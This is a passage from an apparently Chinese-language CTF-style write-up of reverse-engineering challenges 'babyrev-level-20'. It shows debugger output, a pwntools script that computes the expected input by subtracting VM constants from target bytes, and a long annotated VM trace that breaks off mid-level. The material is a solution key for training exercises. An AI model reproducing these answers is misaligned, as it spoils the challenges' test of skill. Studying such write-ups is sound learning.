class="hljs-number">0x44</span> b:<span class="hljs-number">0xd4</span> c:<span class="hljs-number">0xa</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x1b</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x1</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xd4</span> c:<span class="hljs-number">0xa</span> d:<span class="hljs-number">0x18</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x1c</span> f:<span class="hljs-number">0x14</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x2</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x1</span><br>[<span class="hljs-meta">s</span>] SYS <span class="hljs-number">0x2</span> d<br>[<span class="hljs-meta">s</span>] ... write<br></code></pre></td></tr></table></figure>

<p><code>rax+0x300</code>是<code>a1</code>首地址，那么可以读出目标字符串</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x /<span class="hljs-number">21</span>bx $rax+<span class="hljs-number">0</span>xb7 + <span class="hljs-number">0</span>x300 -<span class="hljs-number">20</span><br><span class="hljs-attribute">0x7ffe834dd363</span>: <span class="hljs-number">0</span>x43    <span class="hljs-number">0</span>xed    <span class="hljs-number">0</span>xf2    <span class="hljs-number">0</span>x06    <span class="hljs-number">0</span>x74    <span class="hljs-number">0</span>x8f    <span class="hljs-number">0</span>xb8    <span class="hljs-number">0</span>x43<br><span class="hljs-attribute">0x7ffe834dd36b</span>: <span class="hljs-number">0</span>xd0    <span class="hljs-number">0</span>x49    <span class="hljs-number">0</span>xd5    <span class="hljs-number">0</span>x94    <span class="hljs-number">0</span>x09    <span class="hljs-number">0</span>x9d    <span class="hljs-number">0</span>x9b    <span class="hljs-number">0</span>xf0<br><span class="hljs-attribute">0x7ffe834dd373</span>: <span class="hljs-number">0</span>xa6    <span class="hljs-number">0</span>x6c    <span class="hljs-number">0</span>xe7    <span class="hljs-number">0</span>x62    <span class="hljs-number">0</span>x5b<br></code></pre></td></tr></table></figure>

<p>找到目标字符串，然后根据上述的vmcode能够找到对应的输入字符串，最后做一个减法即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-20-0&#x27;,&#x27;b interpreter_loop&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-20-0&quot;</span>)<br>al = [<span class="hljs-number">0x43</span>-<span class="hljs-number">0xa5</span>, <span class="hljs-number">0xed</span>-<span class="hljs-number">0xce</span>, <span class="hljs-number">0xf2</span>-<span class="hljs-number">0x67</span>, <span class="hljs-number">0x06</span>-<span class="hljs-number">0xab</span>, <span class="hljs-number">0x74</span>-<span class="hljs-number">0x98</span>, <span class="hljs-number">0x8f</span>-<span class="hljs-number">0x46</span>, <span class="hljs-number">0xb8</span>-<span class="hljs-number">0x63</span>, <span class="hljs-number">0x43</span>-<span class="hljs-number">0xe1</span>, <span class="hljs-number">0xd0</span>-<span class="hljs-number">0x48</span>,<span class="hljs-number">0x49</span>-<span class="hljs-number">0x37</span>, <span class="hljs-number">0xd5</span>-<span class="hljs-number">0x3e</span>, <span class="hljs-number">0x94</span>-<span class="hljs-number">0x7f</span>, <span class="hljs-number">0x09</span>-<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>-<span class="hljs-number">0xfa</span>, <span class="hljs-number">0x9b</span>-<span class="hljs-number">0x53</span>, <span class="hljs-number">0xf0</span>-<span class="hljs-number">0x5f</span>, <span class="hljs-number">0xa6</span>-<span class="hljs-number">0x99</span>, <span class="hljs-number">0x6c</span>-<span class="hljs-number">0x31</span>, <span class="hljs-number">0xe7</span>-<span class="hljs-number">0x38</span>, <span class="hljs-number">0x62</span>-<span class="hljs-number">0x8f</span>, <span class="hljs-number">0x5b</span> - <span class="hljs-number">0x89</span>]<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(al)):<br>    <span class="hljs-comment"># print(al[i])</span><br>    payload += struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, (al[i]) % <span class="hljs-number">256</span>)<br><span class="hljs-comment"># payload = struct.pack(&#x27;21B&#x27;, *al)</span><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br>z = p.readline()<br><span class="hljs-keyword">while</span>(z):<br>    <span class="hljs-built_in">print</span>(z)<br>    z = p.readline()<br></code></pre></td></tr></table></figure>



<h4 id="level20-1"><a href="#level20-1" class="headerlink" title="level20.1"></a>level20.1</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x140c6</span>							# <span class="hljs-number">40</span> : IMM	b(<span class="hljs-number">1</span>) = c6<br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">2</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x80801</span>							# <span class="hljs-number">08</span> : stk<br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c6 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:c7 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x140c2</span>							<br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c2 c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:c8 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104005</span>						# <span class="hljs-number">40</span> : IMM c(<span class="hljs-number">0</span>x10) = <span class="hljs-number">05</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:c9 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404001</span>						# <span class="hljs-number">40</span> : IMM a(<span class="hljs-number">0</span>x40) = <span class="hljs-number">0</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:ca f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x48002</span>							# <span class="hljs-number">80</span> :SYS<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">0</span> i:cb f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">1</span> i:cc f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">2</span> i:cd f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x810</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:ce f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:cf f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104022</span>						<br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">22</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:d0 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404000</span>						<br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">22</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">3</span> i:d1 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x18002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">22</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:d2 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">2</span> i:d3 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">1</span> i:d4 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:d5 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x84002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">3</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x840</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">1</span> i:<span class="hljs-number">4</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">2</span> i:<span class="hljs-number">5</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x810</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:c2 c:<span class="hljs-number">5</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040fe</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:c2 c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span>							# <span class="hljs-number">01</span> : LDM b = *a<br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">9</span>e c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">9</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span>							# <span class="hljs-number">10</span> : ADD b c<br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">9</span>c c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:a f:<span class="hljs-number">0</span>		<br><span class="hljs-attribute">0x400201</span>						# <span class="hljs-number">02</span> : STM a = *b			a1[<span class="hljs-number">0</span>x30] = user1 + <span class="hljs-number">0</span>xfe <br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">9</span>c c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404031</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:<span class="hljs-number">9</span>c c:fe d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10409b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:<span class="hljs-number">9</span>c c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:<span class="hljs-number">1</span>f c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:ba c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span>						# <span class="hljs-number">02</span> : STM a = *b			a1[<span class="hljs-number">0</span>x31] = user2 + <span class="hljs-number">0</span>x9b<br><span class="hljs-attribute">a</span>:<span class="hljs-number">31</span> b:ba c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">10</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404032</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:ba c:<span class="hljs-number">9</span>b d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">11</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10403c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:ba c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">12</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:<span class="hljs-number">8</span>b c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">13</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:c7 c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">14</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span> b:c7 c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">15</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404033</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:c7 c:<span class="hljs-number">3</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">16</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040cc</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:c7 c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">17</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:<span class="hljs-number">5</span>b c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">18</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:<span class="hljs-number">27</span> c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">19</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">33</span> b:<span class="hljs-number">27</span> c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404034</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:<span class="hljs-number">27</span> c:cc d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040e3</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:<span class="hljs-number">27</span> c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:dc c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:bf c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">34</span> b:bf c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">1</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404035</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:bf c:e3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">20</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040b0</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:bf c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">21</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:<span class="hljs-number">49</span> c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">22</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:f9 c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">23</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">35</span> b:f9 c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">24</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404036</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:f9 c:b0 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">25</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10401e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:f9 c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">26</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:<span class="hljs-number">55</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">27</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:<span class="hljs-number">73</span> c:<span class="hljs-number">1</span>e d:<span 